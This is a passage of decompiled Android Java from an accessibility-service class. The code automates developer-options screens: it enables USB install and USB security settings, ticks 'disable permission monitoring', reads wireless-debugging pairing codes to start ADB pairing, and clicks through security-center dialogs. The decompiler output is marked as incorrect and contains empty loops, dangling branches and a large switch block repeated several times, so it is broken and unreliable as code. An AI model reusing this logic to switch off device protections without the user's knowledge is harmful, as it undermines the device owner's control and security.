                                                    AbstractC0251g.T0(5);
                                                    if (!AbstractC0026q.m150A()) {
                                                        AbstractC0026q.m164O(null, null);
                                                    }
                                                }
                                                if (AbstractC0251g.f1()) {
                                                }
                                            }
                                            try {
                                                AbstractC0251g.F0(1);
                                                Log.d("PairAccessibilityDelegate", "GlobalActionAutomator back");
                                                Thread.sleep(100L);
                                                break;
                                            } catch (Exception e7) {
                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e7);
                                                return;
                                            }
                                        }
                                    } catch (Exception e8) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e8);
                                        return;
                                    }
                                    break;
                                case 4:
                                    AtomicReference atomicReference2 = a0Var.f841p;
                                    try {
                                        if (!Objects.equals(atomicReference2.get(), enumC0894g3)) {
                                            a0Var.m1062G();
                                            Log.d("PairAccessibilityDelegate", "active root complete");
                                            atomicReference2.set(EnumC0894g.PAIR_DEPT_PAIR_LEAVE_DEV_OPT);
                                            a0.m985R(a0Var.m1072k());
                                            try {
                                                u02 = a0.u0();
                                                uiObject2 = null;
                                            } catch (Exception e9) {
                                                e = e9;
                                                uiObject2 = null;
                                            }
                                            while (uiObject2 == null) {
                                                try {
                                                } catch (Exception e10) {
                                                    e = e10;
                                                    AbstractC0026q.m186s("PairAccessibilityDelegate", e);
                                                    uiObject3 = uiObject2;
                                                    if (uiObject3 != null) {
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str6);
                                                    return;
                                                }
                                                if (a0Var.m1072k() != null) {
                                                    uiObject2 = a0Var.m1072k().findOneByCombine(u02);
                                                    AbstractC0251g.T0(5);
                                                } else {
                                                    if (uiObject2 != null) {
                                                        Log.d("PairAccessibilityDelegate", "使用配对码配对栏目查找成功");
                                                    }
                                                    uiObject3 = uiObject2;
                                                    if (uiObject3 != null) {
                                                        Log.d("PairAccessibilityDelegate", "使用配对码配对栏目查找成功");
                                                        AbstractC0184g.m354h(30);
                                                        UiObject findParentUtilCombine3 = uiObject3.findParentUtilCombine(a0.m987T());
                                                        if (findParentUtilCombine3 != null && findParentUtilCombine3.click()) {
                                                            Log.d("PairAccessibilityDelegate", "使用配对码配对栏目已点击");
                                                            AbstractC0184g.m354h(35);
                                                            break;
                                                        } else {
                                                            str6 = "使用配对码配对栏目点击失败";
                                                        }
                                                    } else {
                                                        str6 = "使用配对码配对栏目查找失败";
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str6);
                                                }
                                            }
                                            if (uiObject2 != null) {
                                            }
                                            uiObject3 = uiObject2;
                                            if (uiObject3 != null) {
                                            }
                                            Log.e("PairAccessibilityDelegate", str6);
                                        }
                                    } catch (Exception e11) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e11);
                                        return;
                                    }
                                    break;
                                case 5:
                                    a0Var.getClass();
                                    try {
                                        boolean m996M = a0Var.m996M();
                                        AtomicReference atomicReference3 = a0Var.f841p;
                                        String str7 = a0Var.f864c;
                                        if (m996M && !a0Var.m1000Q() && !Objects.equals(atomicReference3.get(), enumC0894g3)) {
                                            Object obj2 = atomicReference3.get();
                                            EnumC0894g enumC0894g4 = EnumC0894g.PAIR_DEPT_PAIRING;
                                            if (!Objects.equals(obj2, enumC0894g4)) {
                                                Log.d("PairAccessibilityDelegate", "pairInPairCodeDialog 窗口匹配");
                                                a0Var.m1062G();
                                                Log.d("PairAccessibilityDelegate", "active root complete");
                                                atomicReference3.set(enumC0894g4);
                                                Future m592b = AbstractC0243l.m592b(new CallableC0239h(a0Var), str7);
                                                if (m592b != null) {
                                                    while (!m592b.isDone()) {
                                                        Log.d("PairAccessibilityDelegate", "正在读取配对码和配对端口");
                                                        AbstractC0251g.T0(2);
                                                    }
                                                    try {
                                                        PairPortAndCodeResult pairPortAndCodeResult = (PairPortAndCodeResult) m592b.get();
                                                        if (pairPortAndCodeResult != null) {
                                                            Log.d("PairAccessibilityDelegate", "读取配对码和配对端口完成");
                                                            AbstractC0184g.m354h(40);
                                                            if (C0318e.m844S() != null) {
                                                                Log.d("PairAccessibilityDelegate", "正在发起配对");
                                                                C0318e.m844S().f615m.set(false);
                                                                C0318e.m844S().m852K(pairPortAndCodeResult.getHost(), pairPortAndCodeResult.getPairPort().intValue(), pairPortAndCodeResult.getPairCode());
                                                                if (C0318e.m844S().m860U()) {
                                                                    Log.d("PairAccessibilityDelegate", "本次配对成功");
                                                                    AbstractC0184g.m354h(45);
                                                                    atomicReference3.set(enumC0894g3);
                                                                } else {
                                                                    Log.d("PairAccessibilityDelegate", "本次配对失败");
                                                                }
                                                            }
                                                        } else {
                                                            Log.e("PairAccessibilityDelegate", "读取配对码和配对端口失败");
                                                        }
                                                    } catch (Exception e12) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e12);
                                                    }
                                                }
                                            }
                                        }
                                        if (!Objects.equals(atomicReference3.get(), enumC0894g3)) {
                                            atomicReference3.set(EnumC0894g.PAIR_DEPT_PAIR_FAIL);
                                        }
                                        if (a0Var.m996M()) {
                                            Log.e("PairAccessibilityDelegate", "配对结束,仍然停留在配对码窗口");
                                            if (atomicReference3.get() != enumC0894g3) {
                                                z6 = false;
                                            }
                                            AbstractC0243l.m592b(new CallableC0238g(z6, a0Var), str7);
                                            break;
                                        }
                                    } catch (Exception e13) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e13);
                                        return;
                                    }
                                    break;
                                case 6:
                                    a0Var.getClass();
                                    while (a0Var.m997N()) {
                                        try {
                                            UiObject findOneByCombine3 = a0Var.m1072k().findOneByCombine(a0.m989V());
                                            if (findOneByCombine3 != null && findOneByCombine3.click()) {
                                                Log.d("PairAccessibilityDelegate", "配对失败对话框确定按钮查找并点击完成");
                                                AbstractC0251g.T0(10);
                                            }
                                        } catch (Exception e14) {
                                            AbstractC0026q.m186s("PairAccessibilityDelegate", e14);
                                            return;
                                        }
                                    }
                                    ConcurrentLinkedQueue concurrentLinkedQueue2 = a0Var.f840o;
                                    concurrentLinkedQueue2.remove("pairInWifiDebugWindow");
                                    concurrentLinkedQueue2.remove("pairInPairCodeDialog");
                                    concurrentLinkedQueue2.remove("pairInPairFailDialog");
                                    break;
                                case 7:
                                    a0Var.getClass();
                                    while (a0Var.m1078q(C0420i.m1117L())) {
                                        try {
                                            try {
                                                AbstractC0251g.F0(1);
                                                Log.d("PairAccessibilityDelegate", "GlobalActionAutomator back");
                                                Thread.sleep(100L);
                                            } catch (Exception e15) {
                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e15);
                                            }
                                            AbstractC0251g.T0(5);
                                        } catch (Exception e16) {
                                            AbstractC0026q.m186s("PairAccessibilityDelegate", e16);
                                        }
                                    }
                                    break;
                                default:
                                    a0Var.getClass();
                                    try {
                                        Log.d("PairAccessibilityDelegate", "pairInSecurityCenter 窗口匹配");
                                        UiObject findOneByCombine4 = a0Var.m1072k().findOneByCombine(a0.K0());
                                        if (findOneByCombine4 != null && findOneByCombine4.clickable() && findOneByCombine4.click()) {
                                            Log.d("PairAccessibilityDelegate", "USB安装设置窗口下一步按钮查找并点击完成");
                                            a0Var.f840o.remove("pairInSecurityCenter");
                                            break;
                                        } else {
                                            UiObject findOneByCombine5 = a0Var.m1072k().findOneByCombine(a0.J0());
                                            if (findOneByCombine5 != null) {
                                                Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮查找完成");
                                                if (findOneByCombine5.clickable()) {
                                                    Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮已可以点击");
                                                    if (findOneByCombine5.click()) {
                                                        Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮点击完成");
                                                        AbstractC0251g.T0(10);
                                                        while (true) {
                                                            try {
                                                            } catch (Exception e17) {
                                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e17);
                                                            }
                                                            if (a0Var.m1072k() != null && a0Var.m1072k().findOneByCombine(a0.L0()) != null) {
                                                                Log.d("PairAccessibilityDelegate", "当前处于USB安全设置对话框");
                                                                z3 = true;
                                                                if (z3) {
                                                                    a0Var.f846u = true;
                                                                    a0Var.D0();
                                                                    break;
                                                                } else {
                                                                    Log.d("PairAccessibilityDelegate", "正在开启USB安全设置....");
                                                                    AbstractC0251g.T0(5);
                                                                }
                                                            }
                                                            z3 = false;
                                                            if (z3) {
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    } catch (Exception e18) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e18);
                                        return;
                                    }
                                    break;
                            }
                        }
                    }, str3);
                    return;
                }
                if (m997N()) {
                    if (concurrentLinkedQueue.contains("pairInPairFailDialog")) {
                        return;
                    }
                    concurrentLinkedQueue.add("pairInPairFailDialog");
                    final int i8 = 6;
                    AbstractC0243l.m593c(new Runnable(this) { // from class: o.y

                        /* renamed from: b */
                        public final /* synthetic */ a0 f975b;

                        {
                            this.f975b = this;
                        }

                        /* JADX WARN: Removed duplicated region for block: B:107:0x01a8 A[Catch: Exception -> 0x01a4, TRY_LEAVE, TryCatch #14 {Exception -> 0x01a4, blocks: (B:102:0x0192, B:104:0x0198, B:107:0x01a8), top: B:101:0x0192 }] */
                        /* JADX WARN: Removed duplicated region for block: B:111:0x01b7 A[Catch: Exception -> 0x01e3, TryCatch #15 {Exception -> 0x01e3, blocks: (B:94:0x016e, B:96:0x0178, B:111:0x01b7, B:113:0x01c9, B:115:0x01cf, B:118:0x01df, B:123:0x01b1), top: B:93:0x016e }] */
                        /* JADX WARN: Removed duplicated region for block: B:120:0x01dd  */
                        /* JADX WARN: Removed duplicated region for block: B:216:0x0357 A[Catch: Exception -> 0x0369, TryCatch #6 {Exception -> 0x0369, blocks: (B:204:0x02e0, B:206:0x02e6, B:208:0x02f8, B:210:0x0313, B:212:0x0329, B:214:0x0338, B:216:0x0357, B:217:0x035f, B:219:0x0363, B:276:0x0351, B:278:0x0318), top: B:203:0x02e0, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:219:0x0363 A[Catch: Exception -> 0x0369, TRY_LEAVE, TryCatch #6 {Exception -> 0x0369, blocks: (B:204:0x02e0, B:206:0x02e6, B:208:0x02f8, B:210:0x0313, B:212:0x0329, B:214:0x0338, B:216:0x0357, B:217:0x035f, B:219:0x0363, B:276:0x0351, B:278:0x0318), top: B:203:0x02e0, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:241:0x03fe A[Catch: Exception -> 0x0409, TryCatch #5 {Exception -> 0x0409, blocks: (B:228:0x0384, B:230:0x038a, B:232:0x039d, B:234:0x03b8, B:236:0x03ce, B:238:0x03dd, B:239:0x03fa, B:241:0x03fe, B:243:0x0403, B:268:0x03f6, B:270:0x03bd), top: B:227:0x0384, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:243:0x0403 A[Catch: Exception -> 0x0409, TRY_LEAVE, TryCatch #5 {Exception -> 0x0409, blocks: (B:228:0x0384, B:230:0x038a, B:232:0x039d, B:234:0x03b8, B:236:0x03ce, B:238:0x03dd, B:239:0x03fa, B:241:0x03fe, B:243:0x0403, B:268:0x03f6, B:270:0x03bd), top: B:227:0x0384, outer: #0 }] */
                        /* JADX WARN: Removed duplicated region for block: B:246:0x0418 A[EXC_TOP_SPLITTER, SYNTHETIC] */
                        /* JADX WARN: Removed duplicated region for block: B:253:0x042e A[ADDED_TO_REGION] */
                        /* JADX WARN: Removed duplicated region for block: B:262:0x043b A[ADDED_TO_REGION, SYNTHETIC] */
                        /* JADX WARN: Removed duplicated region for block: B:318:0x04da A[Catch: Exception -> 0x04e9, LOOP:8: B:310:0x04b8->B:318:0x04da, LOOP_END, TryCatch #4 {Exception -> 0x04e9, blocks: (B:295:0x0460, B:297:0x0473, B:299:0x0479, B:301:0x047f, B:303:0x048c, B:305:0x049a, B:307:0x04a5, B:309:0x04b0, B:318:0x04da, B:320:0x04e3, B:325:0x04d4, B:311:0x04b8, B:313:0x04be, B:315:0x04cc), top: B:294:0x0460, inners: #7 }] */
                        /* JADX WARN: Removed duplicated region for block: B:319:0x04e3 A[SYNTHETIC] */
                        @Override // java.lang.Runnable
                        /*
                            Code decompiled incorrectly, please refer to instructions dump.
                        */
                        public final void run() {
                            boolean z3;
                            boolean m998O;
                            UiObject findOneByCombine;
                            String str4;
                            boolean z4;
                            UiObject findOneByCombine2;
                            String str5;
                            boolean z5;
                            UiObject uiObject;
                            UiObject uiObject2;
                            UiObject uiObject3;
                            String str6;
                            CombineFilter u02;
                            EnumC0894g enumC0894g3 = EnumC0894g.PAIR_DEPT_PAIR_SUCCESS;
                            int i42 = i8;
                            boolean z6 = true;
                            a0 a0Var = this.f975b;
                            switch (i42) {
                                case 0:
                                    a0.m982H(a0Var);
                                    break;
                                case 1:
                                    a0.m982H(a0Var);
                                    break;
                                case 2:
                                    a0Var.getClass();
                                    try {
                                        if (a0.t0()) {
                                            a0Var.f841p.set(EnumC0894g.PAIR_DEPT_PAIR_PREPARE_FINISH);
                                            if (AbstractC0249e.m620i()) {
                                                AtomicInteger atomicInteger = new AtomicInteger(0);
                                                while (true) {
                                                    try {
                                                        UiObject f02 = a0Var.f0();
                                                        if (f02 != null && f02.canScrollForward()) {
                                                            f02.scrollForwardEnd();
                                                            a0Var.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                                            AbstractC0251g.T0(5);
                                                            f02 = a0Var.f0();
                                                        }
                                                        if (f02 != null) {
                                                            uiObject = f02.canScrollBackward() ? f02.scrollBackwardUtil(a0.F0()) : null;
                                                            if (uiObject == null && f02.canScrollForward()) {
                                                                uiObject = f02.scrollForwardUtil(a0.F0());
                                                            }
                                                        } else {
                                                            uiObject = null;
                                                        }
                                                        if (uiObject != null && uiObject.parent() != null && a0Var.g0(uiObject.parent(), 20).isChecked()) {
                                                            a0Var.f844s = true;
                                                            Log.d("PairAccessibilityDelegate", "禁用权限监控已勾选");
                                                        }
                                                    } catch (Exception e22) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e22);
                                                    }
                                                    if (!a0Var.f844s && atomicInteger.incrementAndGet() <= 10) {
                                                        AbstractC0251g.T0(10);
                                                    }
                                                }
                                                AbstractC0184g.m354h(80);
                                                a0Var.D0();
                                            }
                                            if (AbstractC0249e.m624m()) {
                                                AtomicInteger atomicInteger2 = new AtomicInteger(0);
                                                while (true) {
                                                    try {
                                                        UiObject f03 = a0Var.f0();
                                                        if (f03 != null) {
                                                            Log.d("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找成功");
                                                            C0981d c0981d = new C0981d(a0.R0(), 2, 0);
                                                            findOneByCombine2 = f03.scrollForwardUtil(c0981d);
                                                            if (findOneByCombine2 == null) {
                                                                f03.scrollBackwardEnd();
                                                                a0Var.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                                                AbstractC0251g.T0(5);
                                                                UiObject f04 = a0Var.f0();
                                                                if (f04 != null) {
                                                                    findOneByCombine2 = f04.scrollForwardUtil(c0981d);
                                                                }
                                                            }
                                                        } else {
                                                            Log.e("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找失败");
                                                            findOneByCombine2 = a0Var.m1072k().findOneByCombine(a0.R0());
                                                        }
                                                    } catch (Exception e3) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e3);
                                                    }
                                                    if (findOneByCombine2 != null) {
                                                        Log.d("PairAccessibilityDelegate", "USB安装栏目查找成功");
                                                        UiObject findParentUtilCombine = findOneByCombine2.findParentUtilCombine(a0.q0());
                                                        if (findParentUtilCombine != null) {
                                                            Log.d("PairAccessibilityDelegate", "USB安装可点击栏目查找成功");
                                                            CheckedResult e02 = a0.e0(findParentUtilCombine);
                                                            a0Var.f845t = e02.isChecked();
                                                            z5 = e02.isClicked();
                                                            if (z5) {
                                                                Log.d("PairAccessibilityDelegate", "USB安装已点击");
                                                                AbstractC0251g.T0(10);
                                                            }
                                                            if (a0Var.f845t) {
                                                                Log.d("PairAccessibilityDelegate", "USB安装已勾选");
                                                            }
                                                            if (a0Var.f845t && atomicInteger2.incrementAndGet() <= 10) {
                                                                AbstractC0251g.T0(10);
                                                            }
                                                        } else {
                                                            str5 = "USB安装可点击栏目查找失败";
                                                        }
                                                    } else {
                                                        str5 = "USB安装栏目查找失败";
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str5);
                                                    z5 = false;
                                                    if (z5) {
                                                    }
                                                    if (a0Var.f845t) {
                                                    }
                                                    if (a0Var.f845t) {
                                                    }
                                                }
                                                AbstractC0184g.m354h(70);
                                                atomicInteger2.set(0);
                                                while (true) {
                                                    try {
                                                        UiObject f05 = a0Var.f0();
                                                        if (f05 != null) {
                                                            Log.d("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找成功");
                                                            C0981d c0981d2 = new C0981d(a0.S0(), 3, 0);
                                                            findOneByCombine = f05.scrollForwardUtil(c0981d2);
                                                            if (findOneByCombine == null) {
                                                                f05.scrollBackwardEnd();
                                                                a0Var.m1061F(MyAccessibilityService.m554P().l0(false).getActiveFastRoot());
                                                                AbstractC0251g.T0(5);
                                                                UiObject f06 = a0Var.f0();
                                                                if (f06 != null) {
                                                                    findOneByCombine = f06.scrollForwardUtil(c0981d2);
                                                                }
                                                            }
                                                        } else {
                                                            Log.e("PairAccessibilityDelegate", "开发者选项窗口滚动视图查找失败");
                                                            findOneByCombine = a0Var.m1072k().findOneByCombine(a0.S0());
                                                        }
                                                    } catch (Exception e4) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e4);
                                                    }
                                                    if (findOneByCombine != null) {
                                                        Log.d("PairAccessibilityDelegate", "USB安全设置栏目查找成功");
                                                        UiObject findParentUtilCombine2 = findOneByCombine.findParentUtilCombine(a0.q0());
                                                        if (findParentUtilCombine2 != null) {
                                                            Log.d("PairAccessibilityDelegate", "USB安全设置可点击栏目查找成功");
                                                            CheckedResult e03 = a0.e0(findParentUtilCombine2);
                                                            a0Var.f846u = e03.isChecked();
                                                            z4 = e03.isClicked();
                                                            if (a0Var.f846u) {
                                                                Log.d("PairAccessibilityDelegate", "USB安全设置已勾选");
                                                            }
                                                            if (z4) {
                                                                Log.d("PairAccessibilityDelegate", "USB安全设置点击成功");
                                                            }
                                                            AtomicInteger atomicInteger3222222 = new AtomicInteger(10);
                                                            for (m998O = a0Var.m998O(); !m998O; m998O = a0Var.m998O()) {
                                                                try {
                                                                } catch (Exception e5) {
                                                                    AbstractC0026q.m186s("PairAccessibilityDelegate", e5);
                                                                }
                                                                if (atomicInteger3222222.decrementAndGet() >= 0) {
                                                                    AbstractC0251g.T0(1);
                                                                } else if (!a0Var.f846u && !m998O && atomicInteger2.incrementAndGet() <= 10) {
                                                                    AbstractC0251g.T0(10);
                                                                }
                                                            }
                                                            if (!a0Var.f846u) {
                                                            }
                                                        } else {
                                                            str4 = "USB安全设置可点击栏目查找失败";
                                                        }
                                                    } else {
                                                        str4 = "USB安全设置栏目查找失败";
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str4);
                                                    z4 = false;
                                                    if (a0Var.f846u) {
                                                    }
                                                    if (z4) {
                                                    }
                                                    AtomicInteger atomicInteger32222222 = new AtomicInteger(10);
                                                    while (!m998O) {
                                                    }
                                                    if (!a0Var.f846u) {
                                                    }
                                                }
                                                AbstractC0184g.m354h(80);
                                                if (a0Var.f846u) {
                                                    Log.d("PairAccessibilityDelegate", "USB安全设置已勾选");
                                                }
                                            }
                                            a0Var.f840o.remove("pairInPrepareFinish");
                                            break;
                                        }
                                        a0Var.D0();
                                        a0Var.f840o.remove("pairInPrepareFinish");
                                    } catch (Exception e6) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e6);
                                        return;
                                    }
                                    break;
                                case 3:
                                    a0Var.getClass();
                                    try {
                                        a0Var.f840o.remove("pairInPairSuccess");
                                        if (!a0.t0()) {
                                            a0Var.D0();
                                            break;
                                        } else {
                                            if (AbstractC0249e.m624m() && Build.VERSION.SDK_INT >= 35) {
                                                if (AbstractC0026q.m172b()) {
                                                    AbstractC0251g.T0(5);
                                                    if (!AbstractC0026q.m150A()) {
                                                        AbstractC0026q.m164O(null, null);
                                                    }
                                                }
                                                if (AbstractC0251g.f1()) {
                                                }
                                            }
                                            try {
                                                AbstractC0251g.F0(1);
                                                Log.d("PairAccessibilityDelegate", "GlobalActionAutomator back");
                                                Thread.sleep(100L);
                                                break;
                                            } catch (Exception e7) {
                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e7);
                                                return;
                                            }
                                        }
                                    } catch (Exception e8) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e8);
                                        return;
                                    }
                                    break;
                                case 4:
                                    AtomicReference atomicReference2 = a0Var.f841p;
                                    try {
                                        if (!Objects.equals(atomicReference2.get(), enumC0894g3)) {
                                            a0Var.m1062G();
                                            Log.d("PairAccessibilityDelegate", "active root complete");
                                            atomicReference2.set(EnumC0894g.PAIR_DEPT_PAIR_LEAVE_DEV_OPT);
                                            a0.m985R(a0Var.m1072k());
                                            try {
                                                u02 = a0.u0();
                                                uiObject2 = null;
                                            } catch (Exception e9) {
                                                e = e9;
                                                uiObject2 = null;
                                            }
                                            while (uiObject2 == null) {
                                                try {
                                                } catch (Exception e10) {
                                                    e = e10;
                                                    AbstractC0026q.m186s("PairAccessibilityDelegate", e);
                                                    uiObject3 = uiObject2;
                                                    if (uiObject3 != null) {
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str6);
                                                    return;
                                                }
                                                if (a0Var.m1072k() != null) {
                                                    uiObject2 = a0Var.m1072k().findOneByCombine(u02);
                                                    AbstractC0251g.T0(5);
                                                } else {
                                                    if (uiObject2 != null) {
                                                        Log.d("PairAccessibilityDelegate", "使用配对码配对栏目查找成功");
                                                    }
                                                    uiObject3 = uiObject2;
                                                    if (uiObject3 != null) {
                                                        Log.d("PairAccessibilityDelegate", "使用配对码配对栏目查找成功");
                                                        AbstractC0184g.m354h(30);
                                                        UiObject findParentUtilCombine3 = uiObject3.findParentUtilCombine(a0.m987T());
                                                        if (findParentUtilCombine3 != null && findParentUtilCombine3.click()) {
                                                            Log.d("PairAccessibilityDelegate", "使用配对码配对栏目已点击");
                                                            AbstractC0184g.m354h(35);
                                                            break;
                                                        } else {
                                                            str6 = "使用配对码配对栏目点击失败";
                                                        }
                                                    } else {
                                                        str6 = "使用配对码配对栏目查找失败";
                                                    }
                                                    Log.e("PairAccessibilityDelegate", str6);
                                                }
                                            }
                                            if (uiObject2 != null) {
                                            }
                                            uiObject3 = uiObject2;
                                            if (uiObject3 != null) {
                                            }
                                            Log.e("PairAccessibilityDelegate", str6);
                                        }
                                    } catch (Exception e11) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e11);
                                        return;
                                    }
                                    break;
                                case 5:
                                    a0Var.getClass();
                                    try {
                                        boolean m996M = a0Var.m996M();
                                        AtomicReference atomicReference3 = a0Var.f841p;
                                        String str7 = a0Var.f864c;
                                        if (m996M && !a0Var.m1000Q() && !Objects.equals(atomicReference3.get(), enumC0894g3)) {
                                            Object obj2 = atomicReference3.get();
                                            EnumC0894g enumC0894g4 = EnumC0894g.PAIR_DEPT_PAIRING;
                                            if (!Objects.equals(obj2, enumC0894g4)) {
                                                Log.d("PairAccessibilityDelegate", "pairInPairCodeDialog 窗口匹配");
                                                a0Var.m1062G();
                                                Log.d("PairAccessibilityDelegate", "active root complete");
                                                atomicReference3.set(enumC0894g4);
                                                Future m592b = AbstractC0243l.m592b(new CallableC0239h(a0Var), str7);
                                                if (m592b != null) {
                                                    while (!m592b.isDone()) {
                                                        Log.d("PairAccessibilityDelegate", "正在读取配对码和配对端口");
                                                        AbstractC0251g.T0(2);
                                                    }
                                                    try {
                                                        PairPortAndCodeResult pairPortAndCodeResult = (PairPortAndCodeResult) m592b.get();
                                                        if (pairPortAndCodeResult != null) {
                                                            Log.d("PairAccessibilityDelegate", "读取配对码和配对端口完成");
                                                            AbstractC0184g.m354h(40);
                                                            if (C0318e.m844S() != null) {
                                                                Log.d("PairAccessibilityDelegate", "正在发起配对");
                                                                C0318e.m844S().f615m.set(false);
                                                                C0318e.m844S().m852K(pairPortAndCodeResult.getHost(), pairPortAndCodeResult.getPairPort().intValue(), pairPortAndCodeResult.getPairCode());
                                                                if (C0318e.m844S().m860U()) {
                                                                    Log.d("PairAccessibilityDelegate", "本次配对成功");
                                                                    AbstractC0184g.m354h(45);
                                                                    atomicReference3.set(enumC0894g3);
                                                                } else {
                                                                    Log.d("PairAccessibilityDelegate", "本次配对失败");
                                                                }
                                                            }
                                                        } else {
                                                            Log.e("PairAccessibilityDelegate", "读取配对码和配对端口失败");
                                                        }
                                                    } catch (Exception e12) {
                                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e12);
                                                    }
                                                }
                                            }
                                        }
                                        if (!Objects.equals(atomicReference3.get(), enumC0894g3)) {
                                            atomicReference3.set(EnumC0894g.PAIR_DEPT_PAIR_FAIL);
                                        }
                                        if (a0Var.m996M()) {
                                            Log.e("PairAccessibilityDelegate", "配对结束,仍然停留在配对码窗口");
                                            if (atomicReference3.get() != enumC0894g3) {
                                                z6 = false;
                                            }
                                            AbstractC0243l.m592b(new CallableC0238g(z6, a0Var), str7);
                                            break;
                                        }
                                    } catch (Exception e13) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e13);
                                        return;
                                    }
                                    break;
                                case 6:
                                    a0Var.getClass();
                                    while (a0Var.m997N()) {
                                        try {
                                            UiObject findOneByCombine3 = a0Var.m1072k().findOneByCombine(a0.m989V());
                                            if (findOneByCombine3 != null && findOneByCombine3.click()) {
                                                Log.d("PairAccessibilityDelegate", "配对失败对话框确定按钮查找并点击完成");
                                                AbstractC0251g.T0(10);
                                            }
                                        } catch (Exception e14) {
                                            AbstractC0026q.m186s("PairAccessibilityDelegate", e14);
                                            return;
                                        }
                                    }
                                    ConcurrentLinkedQueue concurrentLinkedQueue2 = a0Var.f840o;
                                    concurrentLinkedQueue2.remove("pairInWifiDebugWindow");
                                    concurrentLinkedQueue2.remove("pairInPairCodeDialog");
                                    concurrentLinkedQueue2.remove("pairInPairFailDialog");
                                    break;
                                case 7:
                                    a0Var.getClass();
                                    while (a0Var.m1078q(C0420i.m1117L())) {
                                        try {
                                            try {
                                                AbstractC0251g.F0(1);
                                                Log.d("PairAccessibilityDelegate", "GlobalActionAutomator back");
                                                Thread.sleep(100L);
                                            } catch (Exception e15) {
                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e15);
                                            }
                                            AbstractC0251g.T0(5);
                                        } catch (Exception e16) {
                                            AbstractC0026q.m186s("PairAccessibilityDelegate", e16);
                                        }
                                    }
                                    break;
                                default:
                                    a0Var.getClass();
                                    try {
                                        Log.d("PairAccessibilityDelegate", "pairInSecurityCenter 窗口匹配");
                                        UiObject findOneByCombine4 = a0Var.m1072k().findOneByCombine(a0.K0());
                                        if (findOneByCombine4 != null && findOneByCombine4.clickable() && findOneByCombine4.click()) {
                                            Log.d("PairAccessibilityDelegate", "USB安装设置窗口下一步按钮查找并点击完成");
                                            a0Var.f840o.remove("pairInSecurityCenter");
                                            break;
                                        } else {
                                            UiObject findOneByCombine5 = a0Var.m1072k().findOneByCombine(a0.J0());
                                            if (findOneByCombine5 != null) {
                                                Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮查找完成");
                                                if (findOneByCombine5.clickable()) {
                                                    Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮已可以点击");
                                                    if (findOneByCombine5.click()) {
                                                        Log.d("PairAccessibilityDelegate", "USB安装设置窗口允许按钮点击完成");
                                                        AbstractC0251g.T0(10);
                                                        while (true) {
                                                            try {
                                                            } catch (Exception e17) {
                                                                AbstractC0026q.m186s("PairAccessibilityDelegate", e17);
                                                            }
                                                            if (a0Var.m1072k() != null && a0Var.m1072k().findOneByCombine(a0.L0()) != null) {
                                                                Log.d("PairAccessibilityDelegate", "当前处于USB安全设置对话框");
                                                                z3 = true;
                                                                if (z3) {
                                                                    a0Var.f846u = true;
                                                                    a0Var.D0();
                                                                    break;
                                                                } else {
                                                                    Log.d("PairAccessibilityDelegate", "正在开启USB安全设置....");
                                                                    AbstractC0251g.T0(5);
                                                                }
                                                            }
                                                            z3 = false;
                                                            if (z3) {
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    } catch (Exception e18) {
                                        AbstractC0026q.m186s("PairAccessibilityDelegate", e18);
                                        return;
                                    }
                                    break;
                            }
                        }
                    }, str3);
                    return;
                }
                try {
                } catch (Exception e3) {
                    AbstractC0026q.m186s("PairAccessibilityDelegate", e3);
                }
                if (m1078q(C0420i.m1117L())) {
                    Log.d("PairAccessibilityDelegate", "已进入锁屏密码验证窗口");
                    if (i2 != 0) {
                        if (m998O()) {
                            final int i9 = 8;
                            AbstractC0243l.m593c(new Runnable(this) { // from class: o.y

                                /* renamed from: b */
                                public final /* synthetic */ a0 f975b;

                                {
                                    this.f975b = this;
                                }

                                /* JADX WARN: Removed duplicated region for block: B:107:0x01a8 A[Catch: Exception -> 0x01a4, TRY_LEAVE, TryCatch #14 {Exception -> 0x01a4, blocks: (B:102:0x0192, B:104:0x0198, B:107:0x01a8), top: B:101:0x0192 }] */
                                /* JADX WARN: Removed duplicated region for block: B:111:0x01b7 A[Catch: Exception -> 0x01e3, TryCatch #15 {Exception -> 0x01e3, blocks: (B:94:0x016e, B:96:0x0178, B:111:0x01b7, B:113:0x01c9, B:115:0x01cf, B:118:0x01df, B:123:0x01b1), top: B:93:0x016e }] */
                                /* JADX WARN: Removed duplicated region for block: B:120:0x01dd  */
